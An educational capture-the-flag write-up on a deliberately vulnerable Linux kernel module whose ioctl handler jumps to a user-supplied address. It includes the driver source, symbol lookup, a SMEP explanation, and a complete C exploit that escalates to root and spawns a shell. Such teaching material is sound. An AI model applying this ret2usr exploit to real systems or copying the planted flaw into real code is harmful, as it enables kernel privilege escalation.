---
title: "Procfs Indirect Call Challenge"
description: "Documentation of a kernel challenge involving an arbitrary indirect call to user-space."
date: "2026-01-05"
order: 11
draft: false
---

# Procfs Indirect Call: Jumping to User-Space

This challenge demonstrates a severe vulnerability: an arbitrary indirect call. The kernel module accepts an address from user-space and jumps to it. This allows an attacker to redirect kernel execution to their own code, typically a "win" function that elevates privileges.

## The Driver Code

The module creates `/proc/pwn_indirect`. The `ioctl` handler takes the `arg` (provided by the user) and executes it as a function pointer.

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

#define PROC_FILENAME "pwn_indirect"
#define IOCTL_INDIRECT_CALL 0x1339

MODULE_LICENSE("GPL");
MODULE_AUTHOR("fitrafep");
MODULE_DESCRIPTION("Indirect Call Challenge");

static struct proc_dir_entry *proc_entry;

static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    if (cmd == IOCTL_INDIRECT_CALL) {
        printk(KERN_INFO "indirect_call_chall: Jumping to user-provided address 0x%lx\n", arg);
        // VULNERABILITY: Arbitrary indirect call
        ((void (*)(void))arg)();
        return 0;
    }

    return -EINVAL;
}

#ifdef HAVE_PROC_OPS
static const struct proc_ops proc_fops = {
    .proc_ioctl = device_ioctl,
};
#else
static const struct file_operations proc_fops = {
    .unlocked_ioctl = device_ioctl,
};
#endif

static int __init indirect_call_init(void)
{
    proc_entry = proc_create(PROC_FILENAME, 0666, NULL, &proc_fops);
    return proc_entry ? 0 : -ENOMEM;
}

static void __exit indirect_call_exit(void)
{
    proc_remove(proc_entry);
}

module_init(indirect_call_init);
module_exit(indirect_call_exit);
```

## Makefile

```makefile
obj-m += secret_chall.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

## Finding Kernel Symbols

To elevate privileges from our user-space "win" function, we need to call `commit_creds(prepare_kernel_cred(NULL))`. Since we are in the kernel, we need the actual memory addresses of these functions. You can find them by inspecting the `vmlinux` binary (the uncompressed kernel image) using `nm`.

```bash
# Search for the function symbols in the kernel binary
nm vmlinux | grep -E " commit_creds$| prepare_kernel_cred$"
```

**Example Output:**
```text
ffffffff81089310 T commit_creds
ffffffff81089660 T prepare_kernel_cred
```

These addresses are then hardcoded into the exploit script to allow the user-space function to perform kernel-level operations once execution is redirected.

## SMEP: Supervisor Mode Execution Prevention

**SMEP** is a hardware security feature (controlled by the CR4 register) that prevents the kernel from executing code located in user-space pages.

1. **Without SMEP**: The kernel can jump directly to our `win()` function in the exploit binary and execute it with kernel privileges.
2. **With SMEP**: As soon as the kernel attempts to execute an instruction in a user-space memory page, the CPU triggers a Page Fault, resulting in a **Kernel Panic**.

To successfully run this specific exploit, the environment must be launched with SMEP disabled (using the `nosmep` boot parameter in QEMU). Modern exploits bypass SMEP using **ROP (Return-Oriented Programming)** to execute code within kernel-space pages.

## Exploit Script (C)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define IOCTL_INDIRECT_CALL 0x1339

typedef void* (*prepare_kernel_cred_t)(void*);
typedef int (*commit_creds_t)(void*);

// Addresses found via 'nm vmlinux'
prepare_kernel_cred_t prepare_kernel_cred = (prepare_kernel_cred_t)0xffffffff81089660;
commit_creds_t commit_creds = (commit_creds_t)0xffffffff81089310;

void win() {
    commit_creds(prepare_kernel_cred(NULL));
}

int main() {
    // 1. Open the proc entry
    int fd = open("/proc/pwn_indirect", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    // 2. Redirect execution to our win() function
    // Note: This requires SMEP to be disabled (nosmep)
    if (ioctl(fd, IOCTL_INDIRECT_CALL, (unsigned long)win) < 0) {
        perror("ioctl");
        return 1;
    }

    // 3. Verify root escalation
    if (getuid() == 0) {
        printf("[+] Success! We are root.\n");
        system("/bin/sh");
    } else {
        printf("[-] Failed to get root.\n");
    }

    close(fd);
    return 0;
}
```

## Deployment

Modify the `rootfs/init` script to load the module and trigger the exploit:

```diff
-exec /bin/sh
+insmod /secret_chall.ko
+su pwn -c "/exploit_secret"
+poweroff -f
```
